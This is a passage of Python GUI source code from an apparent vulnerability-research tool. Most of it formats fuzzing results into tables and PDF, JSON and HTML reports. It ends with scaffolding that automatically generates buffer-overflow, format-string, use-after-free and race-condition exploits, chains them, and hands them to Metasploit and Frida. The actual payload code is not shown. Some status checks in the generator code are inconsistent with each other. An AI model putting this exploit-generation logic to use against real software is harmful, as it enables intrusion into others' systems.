            type_item = QTableWidgetItem(vuln.get("type", "Unknown"))
            self.vulnerabilities_table.setItem(row, 0, type_item)

            # Severity with color coding
            severity = vuln.get("severity", "Unknown")
            severity_item = QTableWidgetItem(severity)
            if severity == "critical":
                severity_item.setBackground(Qt.GlobalColor.red)
                severity_item.setForeground(Qt.GlobalColor.white)
            elif severity == "high":
                severity_item.setBackground(Qt.GlobalColor.darkRed)
                severity_item.setForeground(Qt.GlobalColor.white)
            elif severity == "medium":
                severity_item.setBackground(Qt.GlobalColor.darkYellow)
            elif severity == "low":
                severity_item.setBackground(Qt.GlobalColor.yellow)
            self.vulnerabilities_table.setItem(row, 1, severity_item)

            # Location
            location = vuln.get("location", vuln.get("position", "Unknown"))
            if isinstance(location, (list, tuple)):
                location = ", ".join(str(loc) for loc in location[:3])
            self.vulnerabilities_table.setItem(row, 2, QTableWidgetItem(str(location)))

            # Exploitable
            exploitable = vuln.get("exploitable", vuln.get("exploit_potential", "Unknown"))
            exploit_item = QTableWidgetItem(str(exploitable))
            if exploitable in ["high", "critical", "yes", True]:
                exploit_item.setBackground(Qt.GlobalColor.darkGreen)
                exploit_item.setForeground(Qt.GlobalColor.white)
            self.vulnerabilities_table.setItem(row, 3, exploit_item)

            # Description
            desc = vuln.get("description", "")
            if len(desc) > 100:
                desc = desc[:97] + "..."
            self.vulnerabilities_table.setItem(row, 4, QTableWidgetItem(desc))

        self.vulnerabilities_table.resizeColumnsToContents()

    def _update_correlation_tab(self, result_data: dict):
        """Update correlation tab with cross-reference analysis."""
        correlation_text = "=== Vulnerability Correlation Analysis ===\n\n"

        # Group vulnerabilities by type
        vuln_groups = {}
        for vuln in result_data.get("vulnerabilities", []):
            vuln_type = vuln.get("type", "Unknown")
            if vuln_type not in vuln_groups:
                vuln_groups[vuln_type] = []
            vuln_groups[vuln_type].append(vuln)

        # Analyze patterns
        for vuln_type, vulns in vuln_groups.items():
            correlation_text += f"Type: {vuln_type}\n"
            correlation_text += f"Count: {len(vulns)}\n"

            # Find common patterns
            if len(vulns) > 1:
                # Check for common functions
                functions = [v.get("function", "") for v in vulns if v.get("function")]
                if functions:
                    from collections import Counter

                    common_funcs = Counter(functions).most_common(3)
                    correlation_text += (
                        "Common Functions: " + ", ".join(f[0] for f in common_funcs) + "\n"
                    )

                # Check for proximity
                positions = [
                    v.get("position", 0)
                    for v in vulns
                    if isinstance(v.get("position"), (int, float))
                ]
                if len(positions) > 1:
                    positions.sort()
                    avg_distance = sum(
                        positions[i + 1] - positions[i] for i in range(len(positions) - 1)
                    ) / (len(positions) - 1)
                    correlation_text += f"Average Distance: {avg_distance:.0f} bytes\n"

            correlation_text += "\n"

        # Crash correlation
        if result_data.get("crashes"):
            correlation_text += "=== Crash Correlation ===\n"
            crashes = result_data.get("crashes", [])

            # Group by crash type
            crash_types = {}
            for crash in crashes:
                crash_type = crash.get("crash_type", "Unknown")
                if crash_type not in crash_types:
                    crash_types[crash_type] = 0
                crash_types[crash_type] += 1

            for crash_type, count in crash_types.items():
                correlation_text += f"{crash_type}: {count} crashes\n"

            # Exploitability correlation
            exploitable = [c for c in crashes if c.get("exploitability") in ["high", "critical"]]
            if exploitable:
                correlation_text += f"\nHighly Exploitable Crashes: {len(exploitable)}\n"
                for crash in exploitable[:5]:  # Show top 5
                    correlation_text += f"  - Hash: {crash.get('hash', 'Unknown')[:8]}, Type: {crash.get('crash_type')}\n"

        self.correlation_edit.setText(correlation_text)

    def _update_raw_data_tab(self, result_data: dict):
        """Update raw data tab with JSON representation."""
        import json

        # Create a copy to avoid modifying original
        display_data = result_data.copy()

        # Truncate large lists for display
        if "vulnerabilities" in display_data and len(display_data["vulnerabilities"]) > 10:
            display_data["vulnerabilities"] = display_data["vulnerabilities"][:10]
            display_data["vulnerabilities_truncated"] = True
            display_data["total_vulnerabilities"] = len(result_data["vulnerabilities"])

        if "crashes" in display_data and len(display_data["crashes"]) > 10:
            display_data["crashes"] = display_data["crashes"][:10]
            display_data["crashes_truncated"] = True
            display_data["total_crashes"] = len(result_data["crashes"])

        # Pretty print JSON
        raw_json = json.dumps(display_data, indent=2, sort_keys=True, default=str)
        self.raw_data_edit.setText(raw_json)

    def _count_by_severity(self, vulnerabilities: list[dict], severity: str) -> int:
        """Count vulnerabilities by severity level."""
        return sum(1 for v in vulnerabilities if v.get("severity", "").lower() == severity.lower())

    def _count_by_type(self, vulnerabilities: list[dict], vuln_type: str) -> int:
        """Count vulnerabilities by type."""
        return sum(1 for v in vulnerabilities if vuln_type.lower() in v.get("type", "").lower())

    def _generate_report(self):
        """Generate analysis report."""
        selected_items = self.results_tree.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select results to generate report.")
            return

        # Get report options
        options_dialog = ReportOptionsDialog(self)
        if options_dialog.exec() != QDialog.Accepted:
            return

        report_format = options_dialog.format_combo.currentText()
        include_raw_data = options_dialog.raw_data_check.isChecked()
        include_recommendations = options_dialog.recommendations_check.isChecked()

        # Collect results for report
        results_to_report = []
        for item in selected_items:
            campaign_id = item.data(0, Qt.UserRole)
            if campaign_id in self.campaign_results:
                results_to_report.append(
                    {
                        "campaign_id": campaign_id,
                        "campaign_name": item.text(0),
                        "results": self.campaign_results[campaign_id],
                    }
                )

        if not results_to_report:
            QMessageBox.warning(self, "Warning", "No valid results to report.")
            return

        # Generate report
        try:
            if report_format == "PDF":
                report_path = self._generate_pdf_report(
                    results_to_report, include_raw_data, include_recommendations
                )
            elif report_format == "JSON":
                report_path = self._generate_json_report(results_to_report, include_raw_data)
            elif report_format == "HTML":
                report_path = self._generate_html_report(
                    results_to_report, include_raw_data, include_recommendations
                )
            else:
                QMessageBox.warning(self, "Warning", f"Unsupported report format: {report_format}")
                return

            if report_path:
                reply = QMessageBox.question(
                    self,
                    "Report Generated",
                    f"Report saved to:\n{report_path}\n\nDo you want to open it?",
                    QMessageBox.Yes | QMessageBox.No,
                )

                if reply == QMessageBox.Yes:
                    import os

                    if os.name == "nt":
                        os.startfile(report_path)  # noqa: S606  # Legitimate vulnerability report opening for security research viewing
                    else:
                        import subprocess
                        open_path = shutil.which("open")
                        if open_path:
                            subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                [open_path, report_path], shell=False
                            )

        except Exception as e:
            logger.error(f"Report generation failed: {e}")
            QMessageBox.critical(self, "Error", f"Failed to generate report: {e!s}")

    def _generate_pdf_report(
        self, results: list[dict], include_raw_data: bool, include_recommendations: bool
    ) -> str:
        """Generate PDF report with vulnerability findings."""
        from PyQt6.QtGui import QTextCursor, QTextDocument


        # Get output path
        default_name = f"vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save PDF Report",
            default_name,
            "PDF Files (*.pdf)",
        )

        if not file_path:
            return None

        # Create PDF document
        document = QTextDocument()
        cursor = QTextCursor(document)

        # Title page
        cursor.insertHtml(f"""
        <h1 style='text-align: center; color: #2c3e50;'>Vulnerability Research Report</h1>
        <h3 style='text-align: center; color: #7f8c8d;'>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</h3>
        <hr>
        """)

        # Executive summary
        cursor.insertHtml("<h2>Executive Summary</h2>")

        total_vulns = sum(len(r["results"].get("vulnerabilities", [])) for r in results)
        total_critical = sum(
            self._count_by_severity(r["results"].get("vulnerabilities", []), "critical")
            for r in results
        )
        total_high = sum(
            self._count_by_severity(r["results"].get("vulnerabilities", []), "high")
            for r in results
        )

        cursor.insertHtml(f"""
        <p>This report contains the analysis results from {len(results)} campaign(s).</p>
        <ul>
            <li>Total Vulnerabilities Found: <b>{total_vulns}</b></li>
            <li>Critical Severity: <b style='color: red;'>{total_critical}</b></li>
            <li>High Severity: <b style='color: darkred;'>{total_high}</b></li>
        </ul>
        """)

        # Campaign results
        for result_data in results:
            cursor.insertHtml(f"<h2>Campaign: {result_data['campaign_name']}</h2>")
            campaign_results = result_data["results"]

            # Summary statistics
            cursor.insertHtml("<h3>Summary</h3>")
            cursor.insertHtml(f"""
            <table border='1' cellpadding='5' style='border-collapse: collapse;'>
                <tr><td><b>Campaign Type</b></td><td>{campaign_results.get('campaign_type', 'Unknown')}</td></tr>
                <tr><td><b>Status</b></td><td>{campaign_results.get('status', 'Unknown')}</td></tr>
                <tr><td><b>Duration</b></td><td>{self._format_duration(campaign_results.get('duration', 0))}</td></tr>
                <tr><td><b>Test Cases</b></td><td>{campaign_results.get('test_cases', 0)}</td></tr>
                <tr><td><b>Coverage</b></td><td>{campaign_results.get('coverage', {}).get('percentage', 0):.1f}%</td></tr>
            </table>
            """)

            # Vulnerabilities
            vulnerabilities = campaign_results.get("vulnerabilities", [])
            if vulnerabilities:
                cursor.insertHtml("<h3>Vulnerabilities Found</h3>")
                cursor.insertHtml("""
                <table border='1' cellpadding='5' style='border-collapse: collapse; width: 100%;'>
                    <tr style='background-color: #ecf0f1;'>
                        <th>Type</th>
                        <th>Severity</th>
                        <th>Location</th>
                        <th>Exploitable</th>
                        <th>Description</th>
                    </tr>
                """)

                for vuln in vulnerabilities[:20]:  # Limit to 20 per campaign
                    severity_color = {
                        "critical": "red",
                        "high": "darkred",
                        "medium": "orange",
                        "low": "yellow",
                    }.get(vuln.get("severity", "").lower(), "black")

                    cursor.insertHtml(f"""
                    <tr>
                        <td>{vuln.get('type', 'Unknown')}</td>
                        <td style='color: {severity_color};'><b>{vuln.get('severity', 'Unknown')}</b></td>
                        <td>{str(vuln.get('location', 'Unknown'))[:50]}</td>
                        <td>{vuln.get('exploitable', 'Unknown')}</td>
                        <td>{vuln.get('description', '')[:100]}</td>
                    </tr>
                    """)

                cursor.insertHtml("</table>")

                if len(vulnerabilities) > 20:
                    cursor.insertHtml(
                        f"<p><i>... and {len(vulnerabilities) - 20} more vulnerabilities</i></p>"
                    )

            # Page break between campaigns
            cursor.insertHtml("<div style='page-break-after: always;'></div>")

        # Recommendations
        if include_recommendations:
            cursor.insertHtml("<h2>Recommendations</h2>")
            recommendations = self._generate_recommendations_from_results(results)
            cursor.insertHtml("<ul>")
            for rec in recommendations:
                cursor.insertHtml(f"<li>{rec}</li>")
            cursor.insertHtml("</ul>")

        # Raw data appendix
        if include_raw_data:
            cursor.insertHtml("<h2>Appendix: Raw Data</h2>")
            cursor.insertHtml("<p><i>See attached JSON file for complete raw data.</i></p>")

            # Also save JSON file
            json_path = file_path.replace(".pdf", "_raw_data.json")
            import json

            with open(json_path, "w") as f:
                json.dump([r["results"] for r in results], f, indent=2, default=str)

        # Save PDF
        printer = QPrinter(QPrinter.PrinterMode.HighResolution)
        printer.setOutputFormat(QPrinter.OutputFormat.PdfFormat)
        printer.setOutputFileName(file_path)
        printer.setPageSize(QPrinter.PageSize.A4)

        document.print(printer)

        logger.info(f"PDF report generated: {file_path}")
        return file_path

    def _generate_json_report(self, results: list[dict], include_raw_data: bool) -> str:
        """Generate JSON report."""
        import json

        default_name = f"vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save JSON Report",
            default_name,
            "JSON Files (*.json)",
        )

        if not file_path:
            return None

        report_data = {
            "metadata": {
                "generated_at": datetime.now().isoformat(),
                "generator": "Intellicrack Vulnerability Research",
                "version": "1.0",
                "campaign_count": len(results),
            },
            "summary": {
                "total_vulnerabilities": sum(
                    len(r["results"].get("vulnerabilities", [])) for r in results
                ),
                "total_crashes": sum(r["results"].get("crash_count", 0) for r in results),
                "severity_breakdown": {
                    "critical": sum(
                        self._count_by_severity(r["results"].get("vulnerabilities", []), "critical")
                        for r in results
                    ),
                    "high": sum(
                        self._count_by_severity(r["results"].get("vulnerabilities", []), "high")
                        for r in results
                    ),
                    "medium": sum(
                        self._count_by_severity(r["results"].get("vulnerabilities", []), "medium")
                        for r in results
                    ),
                    "low": sum(
                        self._count_by_severity(r["results"].get("vulnerabilities", []), "low")
                        for r in results
                    ),
                },
            },
            "campaigns": [],
        }

        for result_data in results:
            campaign_report = {
                "campaign_id": result_data["campaign_id"],
                "campaign_name": result_data["campaign_name"],
                "summary": {
                    "type": result_data["results"].get("campaign_type"),
                    "status": result_data["results"].get("status"),
                    "duration": result_data["results"].get("duration"),
                    "vulnerabilities_count": len(result_data["results"].get("vulnerabilities", [])),
                },
            }

            if include_raw_data:
                campaign_report["raw_results"] = result_data["results"]
            else:
                # Include only essential data
                campaign_report["vulnerabilities"] = result_data["results"].get(
                    "vulnerabilities", []
                )[:50]
                campaign_report["statistics"] = result_data["results"].get("statistics", {})

            report_data["campaigns"].append(campaign_report)

        with open(file_path, "w") as f:
            json.dump(report_data, f, indent=2, default=str)

        logger.info(f"JSON report generated: {file_path}")
        return file_path

    def _generate_html_report(
        self, results: list[dict], include_raw_data: bool, include_recommendations: bool
    ) -> str:
        """Generate HTML report."""
        default_name = f"vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save HTML Report",
            default_name,
            "HTML Files (*.html)",
        )

        if not file_path:
            return None

        html_content = self._create_html_report_content(
            results, include_raw_data, include_recommendations
        )

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(html_content)

        logger.info(f"HTML report generated: {file_path}")
        return file_path

    def _create_html_report_content(
        self, results: list[dict], include_raw_data: bool, include_recommendations: bool
    ) -> str:
        """Create HTML content for report."""
        # Calculate statistics
        total_vulns = sum(len(r["results"].get("vulnerabilities", [])) for r in results)
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        vuln_types = {}

        for result in results:
            for vuln in result["results"].get("vulnerabilities", []):
                severity = vuln.get("severity", "LOW")
                severity_counts[severity] = severity_counts.get(severity, 0) + 1

                vuln_type = vuln.get("type", "Unknown")
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Vulnerability Research Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f8f9fa; }}
        .container {{ max-width: 1200px; margin: 0 auto; background-color: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1, h2, h3 {{ color: #2c3e50; }}
        h1 {{ border-bottom: 3px solid #3498db; padding-bottom: 10px; }}
        h2 {{ border-bottom: 1px solid #ecf0f1; padding-bottom: 5px; margin-top: 30px; }}
        table {{ border-collapse: collapse; width: 100%; margin: 10px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #ecf0f1; font-weight: bold; }}
        tr:nth-child(even) {{ background-color: #f9f9f9; }}
        .critical {{ color: #e74c3c; font-weight: bold; }}
        .high {{ color: #c0392b; font-weight: bold; }}
        .medium {{ color: #e67e22; }}
        .low {{ color: #f39c12; }}
        .info {{ color: #3498db; }}
        .summary-box {{ background-color: #ecf0f1; padding: 15px; border-radius: 5px; margin: 10px 0; }}
        .stat-card {{ display: inline-block; margin: 10px; padding: 15px; border: 1px solid #ddd; border-radius: 5px; min-width: 150px; text-align: center; }}
        .stat-number {{ font-size: 24px; font-weight: bold; color: #2c3e50; }}
        .stat-label {{ color: #7f8c8d; font-size: 12px; }}
        .recommendation {{ background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; border-radius: 5px; margin: 10px 0; }}
        .code-block {{ background-color: #f4f4f4; padding: 10px; border-left: 3px solid #3498db; font-family: monospace; overflow-x: auto; }}
        .vulnerability-chart {{ margin: 20px 0; }}
        @media print {{
            .container {{ box-shadow: none; }}
            body {{ background-color: white; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Vulnerability Research Report</h1>
        <div class="summary-box">
            <p><strong>Report Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Total Campaigns Analyzed:</strong> {len(results)}</p>
            <p><strong>Total Vulnerabilities Found:</strong> {total_vulns}</p>
        </div>

        <h2>Executive Summary</h2>
        <div style="display: flex; flex-wrap: wrap;">
            <div class="stat-card">
                <div class="stat-number critical">{severity_counts.get('CRITICAL', 0)}</div>
                <div class="stat-label">Critical</div>
            </div>
            <div class="stat-card">
                <div class="stat-number high">{severity_counts.get('HIGH', 0)}</div>
                <div class="stat-label">High</div>
            </div>
            <div class="stat-card">
                <div class="stat-number medium">{severity_counts.get('MEDIUM', 0)}</div>
                <div class="stat-label">Medium</div>
            </div>
            <div class="stat-card">
                <div class="stat-number low">{severity_counts.get('LOW', 0)}</div>
                <div class="stat-label">Low</div>
            </div>
        </div>

        <h2>Vulnerability Type Distribution</h2>
        <table>
            <tr>
                <th>Vulnerability Type</th>
                <th>Count</th>
                <th>Percentage</th>
            </tr>
            {''.join(f"<tr><td>{vtype}</td><td>{count}</td><td>{(count/total_vulns*100):.1f}%</td></tr>" for vtype, count in sorted(vuln_types.items(), key=lambda x: x[1], reverse=True)[:10])}
        </table>

        <h2>Campaign Details</h2>
        {''.join(self._create_campaign_html(r) for r in results)}

        {self._create_recommendations_html(results) if include_recommendations else ''}

        {self._create_raw_data_html(results) if include_raw_data else ''}

        <div style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center; color: #7f8c8d;">
            <p>Generated by Intellicrack Vulnerability Research System</p>
            <p> 2025 Zachary Flint - All Rights Reserved</p>
        </div>
    </div>
</body>
</html>"""
        return html

    def _create_campaign_html(self, result_data: dict) -> str:
        """Create HTML for single campaign results."""
        campaign = result_data["results"]
        vulns = campaign.get("vulnerabilities", [])

        return f"""
        <h2>Campaign: {result_data['campaign_name']}</h2>
        <table>
            <tr><th>Type</th><td>{campaign.get('campaign_type', 'Unknown')}</td></tr>
            <tr><th>Vulnerabilities</th><td>{len(vulns)}</td></tr>
            <tr><th>Coverage</th><td>{campaign.get('coverage', {}).get('percentage', 0):.1f}%</td></tr>
        </table>

        <h3>Vulnerabilities</h3>
        <table>
            <tr>
                <th>Type</th>
                <th>Severity</th>
                <th>Location</th>
                <th>Description</th>
            </tr>
            {''.join(self._create_vuln_row_html(v) for v in vulns[:20])}
        </table>
        """

    def _create_vuln_row_html(self, vuln: dict) -> str:
        """Create HTML row for vulnerability."""
        severity = vuln.get("severity", "").lower()
        return f"""
        <tr>
            <td>{vuln.get('type', 'Unknown')}</td>
            <td class="{severity}">{vuln.get('severity', 'Unknown')}</td>
            <td>{str(vuln.get('location', 'Unknown'))[:50]}</td>
            <td>{vuln.get('description', '')[:100]}</td>
        </tr>
        """

    def _create_recommendations_html(self, results: list[dict]) -> str:
        """Create recommendations HTML section."""
        recommendations = self._generate_recommendations_from_results(results)
        return f"""
        <h2>Recommendations</h2>
        <ul>
            {''.join(f'<li>{rec}</li>' for rec in recommendations)}
        </ul>
        """

    def _generate_recommendations_from_results(self, results: list[dict]) -> list[str]:
        """Generate recommendations based on analysis results."""
        recommendations = []

        # Analyze all vulnerabilities
        all_vulns = []
        for r in results:
            all_vulns.extend(r["results"].get("vulnerabilities", []))

        # Critical vulnerabilities
        critical_count = self._count_by_severity(all_vulns, "critical")
        if critical_count > 0:
            recommendations.append(
                f"URGENT: Address {critical_count} critical vulnerabilities immediately. "
                "These pose immediate risk to system security.",
            )

        # Memory safety issues
        memory_issues = [
            v
            for v in all_vulns
            if any(
                term in v.get("type", "").lower()
                for term in ["buffer", "overflow", "memory", "heap", "stack", "use-after-free"]
            )
        ]
        if memory_issues:
            recommendations.append(
                f"Implement memory safety measures to address {len(memory_issues)} memory-related vulnerabilities. "
                "Consider using safer memory management practices and bounds checking.",
            )

        # Input validation
        input_issues = [
            v
            for v in all_vulns
            if any(
                term in v.get("type", "").lower()
                for term in ["injection", "format", "validation", "sanitization"]
            )
        ]
        if input_issues:
            recommendations.append(
                f"Strengthen input validation to prevent {len(input_issues)} input-related vulnerabilities. "
                "Implement strict input sanitization and validation routines.",
            )

        # Cryptographic issues
        crypto_issues = [
            v
            for v in all_vulns
            if any(
                term in v.get("type", "").lower()
                for term in ["crypto", "encryption", "hash", "random", "key"]
            )
        ]
        if crypto_issues:
            recommendations.append(
                "Update cryptographic implementations to use modern, secure algorithms. "
                "Replace weak cryptographic functions with industry-standard alternatives.",
            )

        # General recommendations
        if len(all_vulns) > 20:
            recommendations.append(
                "Implement a comprehensive security review process. "
                "The high number of vulnerabilities suggests systemic security issues.",
            )

        # Coverage recommendations
        low_coverage = any(
            r["results"].get("coverage", {}).get("percentage", 0) < 50 for r in results
        )
        if low_coverage:
            recommendations.append(
                "Increase test coverage to improve vulnerability detection. "
                "Current coverage levels may be missing significant security issues.",
            )

        return recommendations

    def _create_raw_data_html(self, results: list[dict]) -> str:
        """Create raw data section for HTML report."""
        html = """
        <h2>Raw Data</h2>
        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
            <p><strong>Note:</strong> This section contains detailed technical data for further analysis.</p>
        </div>
        """

        for i, result in enumerate(results):
            campaign_id = result.get("campaign_id", f"Campaign_{i+1}")
            campaign_data = result.get("results", {})

            html += f"""
            <h3>Campaign: {result.get('campaign_name', campaign_id)}</h3>
            <div class="code-block">
                <h4>Configuration:</h4>
                <pre>{json.dumps(campaign_data.get('configuration', {}), indent=2)}</pre>

                <h4>Coverage Data:</h4>
                <pre>{json.dumps(campaign_data.get('coverage', {}), indent=2)}</pre>

                <h4>Crash Analysis:</h4>
                <pre>{json.dumps(campaign_data.get('crashes', [])[:5], indent=2)}</pre>

                <h4>Full Vulnerability Details:</h4>
                <pre>{json.dumps(campaign_data.get('vulnerabilities', [])[:10], indent=2)}</pre>
            </div>
            """

        return html

    def _integrate_automated_exploitation(self, vulnerabilities, target_binary):
        """Integrate automated exploitation features for identified vulnerabilities."""
        try:
            if not vulnerabilities or not target_binary:
                return {"status": "error", "message": "Missing vulnerabilities or target binary"}

            exploitation_results = {
                "generated_exploits": [],
                "exploit_chains": [],
                "payload_mappings": {},
                "validation_results": {},
                "framework_integration": {}
            }

            # Generate exploits for each vulnerability type
            for vuln in vulnerabilities:
                vuln_type = vuln.get("type", "unknown")
                severity = vuln.get("severity", "medium")
                location = vuln.get("location", "")

                exploit_result = self._generate_exploit_for_vulnerability(
                    vuln_type, severity, location, target_binary
                )

                if exploit_result and exploit_result.get("status") == "success":
                    exploitation_results["generated_exploits"].append(exploit_result)

                    # Attempt to build exploit chains
                    chain_result = self._build_exploit_chain(exploit_result, vulnerabilities, target_binary)
                    if chain_result:
                        exploitation_results["exploit_chains"].append(chain_result)

            # Integrate with existing exploitation frameworks
            framework_integration = self._integrate_exploitation_frameworks(
                exploitation_results["generated_exploits"], target_binary
            )
            exploitation_results["framework_integration"] = framework_integration

            # Validate generated exploits
            validation_results = self._validate_generated_exploits(
                exploitation_results["generated_exploits"], target_binary
            )
            exploitation_results["validation_results"] = validation_results

            return exploitation_results

        except Exception as e:
            logger.error(f"Automated exploitation integration failed: {e}")
            return {"status": "error", "message": str(e)}

    def _generate_exploit_for_vulnerability(self, vuln_type, severity, location, target_binary):
        """Generate specific exploits based on vulnerability type and characteristics."""
        try:
            exploit_templates = {
                "buffer_overflow": self._generate_buffer_overflow_exploit,
                "format_string": self._generate_format_string_exploit,
                "use_after_free": self._generate_uaf_exploit,
                "double_free": self._generate_double_free_exploit,
                "integer_overflow": self._generate_integer_overflow_exploit,
                "race_condition": self._generate_race_condition_exploit,
                "injection": self._generate_injection_exploit,
                "crypto_weakness": self._generate_crypto_exploit,
                "logic_flaw": self._generate_logic_flaw_exploit
            }

            generator_func = exploit_templates.get(vuln_type)
            if not generator_func:
                return self._generate_generic_exploit(vuln_type, severity, location, target_binary)

            return generator_func(severity, location, target_binary)

        except Exception as e:
            logger.error(f"Exploit generation failed for {vuln_type}: {e}")
            return {"status": "error", "message": str(e)}

    def _generate_buffer_overflow_exploit(self, severity, location, target_binary):
        """Generate buffer overflow exploits with ROP chain construction."""
        try:
            # Analyze target binary architecture and protections
            binary_analysis = self._analyze_binary_protections(target_binary)
            architecture = binary_analysis.get("architecture", "x86_64")
            protections = binary_analysis.get("protections", {})

            exploit_data = {
                "type": "buffer_overflow",
                "severity": severity,
                "location": location,
                "architecture": architecture,
                "protections": protections,
                "payload_components": {},
                "exploit_code": "",
                "status": "generated"
            }

            # Generate ROP gadgets if DEP/NX is enabled
            if protections.get("nx_enabled", False):
                rop_gadgets = self._find_rop_gadgets(target_binary, architecture)
                if rop_gadgets:
                    rop_chain = self._build_rop_chain(rop_gadgets, architecture)
                    exploit_data["payload_components"]["rop_chain"] = rop_chain

            # Generate shellcode payload
            shellcode = self._generate_architecture_shellcode(architecture, protections)
            exploit_data["payload_components"]["shellcode"] = shellcode

            # Calculate buffer overflow parameters
            overflow_params = self._calculate_overflow_parameters(location, target_binary)
            exploit_data["payload_components"]["overflow_params"] = overflow_params

            # Generate complete exploit code
            exploit_code = self._assemble_buffer_overflow_exploit(exploit_data)
            exploit_data["exploit_code"] = exploit_code

            # ASLR bypass techniques
            if protections.get("aslr_enabled", False):
                bypass_techniques = self._generate_aslr_bypass(target_binary, architecture)
                exploit_data["payload_components"]["aslr_bypass"] = bypass_techniques

            return exploit_data

        except Exception as e:
            logger.error(f"Buffer overflow exploit generation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _generate_format_string_exploit(self, severity, location, target_binary):
        """Generate format string exploits with arbitrary write capabilities."""
        try:
            binary_analysis = self._analyze_binary_protections(target_binary)

            exploit_data = {
                "type": "format_string",
                "severity": severity,
                "location": location,
                "payload_components": {},
                "exploit_code": "",
                "status": "generated"
            }

            # Identify format string vulnerability parameters
            format_params = self._analyze_format_string_vulnerability(location, target_binary)
            exploit_data["payload_components"]["format_params"] = format_params

            # Generate arbitrary write primitives
            write_primitives = self._generate_format_string_writes(
                format_params, binary_analysis.get("architecture", "x86_64")
            )
            exploit_data["payload_components"]["write_primitives"] = write_primitives

            # Target critical memory locations (GOT, return addresses, function pointers)
            target_locations = self._identify_format_string_targets(target_binary)
            exploit_data["payload_components"]["target_locations"] = target_locations

            # Generate complete format string exploit
            exploit_code = self._assemble_format_string_exploit(exploit_data)
            exploit_data["exploit_code"] = exploit_code

            return exploit_data

        except Exception as e:
            logger.error(f"Format string exploit generation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _generate_uaf_exploit(self, severity, location, target_binary):
        """Generate use-after-free exploits with heap manipulation."""
        try:
            binary_analysis = self._analyze_binary_protections(target_binary)

            exploit_data = {
                "type": "use_after_free",
                "severity": severity,
                "location": location,
                "payload_components": {},
                "exploit_code": "",
                "status": "generated"
            }

            # Analyze heap implementation and protections
            heap_analysis = self._analyze_heap_implementation(target_binary)
            exploit_data["payload_components"]["heap_analysis"] = heap_analysis

            # Generate heap manipulation techniques
            heap_techniques = self._generate_heap_manipulation_techniques(heap_analysis)
            exploit_data["payload_components"]["heap_techniques"] = heap_techniques

            # Create fake objects for UAF exploitation
            fake_objects = self._generate_fake_heap_objects(location, binary_analysis)
            exploit_data["payload_components"]["fake_objects"] = fake_objects

            # Generate complete UAF exploit
            exploit_code = self._assemble_uaf_exploit(exploit_data)
            exploit_data["exploit_code"] = exploit_code

            return exploit_data

        except Exception as e:
            logger.error(f"Use-after-free exploit generation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _generate_race_condition_exploit(self, severity, location, target_binary):
        """Generate race condition exploits with timing manipulation."""
        try:
            exploit_data = {
                "type": "race_condition",
                "severity": severity,
                "location": location,
                "payload_components": {},
                "exploit_code": "",
                "status": "generated"
            }

            # Analyze race condition window
            race_analysis = self._analyze_race_condition_window(location, target_binary)
            exploit_data["payload_components"]["race_analysis"] = race_analysis

            # Generate timing manipulation techniques
            timing_techniques = self._generate_timing_manipulation(race_analysis)
            exploit_data["payload_components"]["timing_techniques"] = timing_techniques

            # Create race condition exploitation strategy
            race_strategy = self._create_race_exploitation_strategy(race_analysis)
            exploit_data["payload_components"]["race_strategy"] = race_strategy

            # Generate multi-threaded exploit code
            exploit_code = self._assemble_race_condition_exploit(exploit_data)
            exploit_data["exploit_code"] = exploit_code

            return exploit_data

        except Exception as e:
            logger.error(f"Race condition exploit generation failed: {e}")
            return {"status": "error", "message": str(e)}

    def _build_exploit_chain(self, primary_exploit, all_vulnerabilities, target_binary):
        """Build multi-stage exploit chains for privilege escalation."""
        try:
            chain_data = {
                "primary_exploit": primary_exploit,
                "chain_stages": [],
                "total_impact": "unknown",
                "chain_reliability": 0.0
            }

            # Identify complementary vulnerabilities for chaining
            compatible_vulns = self._find_chainable_vulnerabilities(
                primary_exploit, all_vulnerabilities
            )

            for vuln in compatible_vulns:
                stage_exploit = self._generate_exploit_for_vulnerability(
                    vuln.get("type"), vuln.get("severity"),
                    vuln.get("location"), target_binary
                )

                if stage_exploit and stage_exploit.get("status") == "generated":
                    chain_stage = {
                        "stage_number": len(chain_data["chain_stages"]) + 2,
                        "vulnerability": vuln,
                        "exploit": stage_exploit,
                        "purpose": self._determine_chain_stage_purpose(vuln, primary_exploit)
                    }
                    chain_data["chain_stages"].append(chain_stage)

            # Calculate overall chain reliability
            chain_data["chain_reliability"] = self._calculate_chain_reliability(chain_data)

            # Determine total impact assessment
            chain_data["total_impact"] = self._assess_chain_impact(chain_data)

            # Generate integrated exploit chain code
            chain_data["integrated_code"] = self._generate_integrated_chain_code(chain_data)

            return chain_data

        except Exception as e:
            logger.error(f"Exploit chain building failed: {e}")
            return None

    def _integrate_exploitation_frameworks(self, generated_exploits, target_binary):
        """Integrate with existing exploitation frameworks and modules."""
        try:
            framework_integration = {
                "frida_scripts": [],
                "ghidra_scripts": [],
                "metasploit_modules": [],
                "custom_payloads": [],
                "integration_status": {}
            }

            for exploit in generated_exploits:
                exploit.get("type", "unknown")

                # Generate Frida scripts for dynamic exploitation
